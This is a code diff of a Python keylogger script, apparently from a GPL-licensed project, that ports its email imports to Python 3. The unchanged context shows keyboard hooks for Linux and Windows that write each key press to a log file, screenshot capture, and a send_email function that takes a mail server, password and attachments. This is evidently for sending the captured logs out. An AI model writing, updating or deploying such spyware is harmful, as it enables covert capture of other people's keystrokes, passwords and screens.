@@ -1,6 +1,16 @@
 #lib importantes
 #-*- coding: utf-8 -*-
 #!/usr/bin/python2
+"""
+  from email.MIMEMultipart import MIMEMultipart
+  from email.MIMEBase import MIMEBase
+  from email.MIMEText import MIMEText
+  from email.mime.image import MIMEImage
+ """ 
+
+
+
+
 
 #Copyright (C) 2008 MrTrue <gui15787@gmail.com>
 #     This program is free software: you can redistribute it and/or modify
@@ -19,19 +29,18 @@
 import platform
 system = platform.system()
 if system == "Linux" or system == "linux":
-
   import pyxhook
   import datetime,os,sys,platform
   import argparse as args
   import smtplib
   from time import *
   import pyscreenshot as ImageGrab
-  from email.MIMEMultipart import MIMEMultipart
-  from email.MIMEBase import MIMEBase
-  from email.MIMEText import MIMEText
+  from email.mime.multipart import MIMEMultipart
+  from email.mime.text import MIMEText
+  from email.mime.base import MIMEBase
   from email.mime.image import MIMEImage
-  from email import Encoders
-  from email.Utils import COMMASPACE, formatdate
+  from email import encoders as Encoders
+  from email.utils import COMMASPACE, formatdate
 
 else:
   import pythoncom,logging
@@ -41,12 +50,12 @@ else:
   import smtplib
   from time import *
   import pyscreenshot as ImageGrab
-  from email.MIMEMultipart import MIMEMultipart
-  from email.MIMEBase import MIMEBase
-  from email.MIMEText import MIMEText
-  from email.mime.image import MIMEImage
-  from email import Encoders
-  from email.Utils import COMMASPACE, formatdate  
+  from email.mime.multipart import MIMEMultipart
+  from email.mime.text import MIMEText
+  from email.mime.base import MIMEBase
+  from email.mime.image import MIMEImage  
+  from email import encoders as Encoders
+  from email.utils import COMMASPACE, formatdate  
 
 #arguments
 parser = args.ArgumentParser()
@@ -151,7 +160,7 @@ def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
     print('%s'%errorMsg)
 
 try:
-
+#Linux version if do you try run this code on linux
   if system == "Linux" or  system == "linux":
     def OnKeyPress(event): #essa função pega as teclas que foram precionadas
       fob=open(log_file,'a')
@@ -170,7 +179,7 @@ try:
     new_hook.HookKeyboard()
     new_hook.start()
     screenshot()
-
+#Windons Version if do you try run it on Windows that is obvious 
   elif system == "Windows":
     def OnKeyboardEvent(event):
       fob=open(log_file,"a")
